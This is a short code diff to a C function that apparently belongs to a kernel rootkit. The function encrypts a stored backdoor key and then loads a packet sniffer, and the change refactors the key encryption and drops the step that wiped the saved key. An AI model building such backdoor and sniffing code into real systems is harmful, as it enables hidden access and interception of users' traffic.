@@ -617,26 +617,22 @@ struct task_struct *kv_sock_start_sniff(void)
 	bool *running = _is_task_running();
 	static struct nf_priv priv;
 	struct task_struct *tsk = NULL;
+    u8 buf[16] = {0};
 
 	/**
 	 * Init bdkey enc
 	 */
-	kvmgc_bdkey = crypto_init();
+	kvmgc_bdkey = kv_crypto_mgc_init();
 	if (!kvmgc_bdkey) {
 		prerr("Failed to encrypt bdkey\n");
 		goto leave;
 	}
-
+	
 	/** for the aes-256, 16 bytes
-	 * is minimum data size
-	 */
-	size_t datalen = 16;
-	u8 buf[16] = {0};
+	* is minimum data size
+	*/
 	memcpy(buf, &auto_bdkey, 8);
-	kv_encrypt(kvmgc_bdkey, buf, datalen);
-
-	/** discard saved key */
-	auto_bdkey = 0;
+	kv_encrypt(kvmgc_bdkey, buf, sizeof(buf));
 
 	// load sniffer
 	if (!*running) {
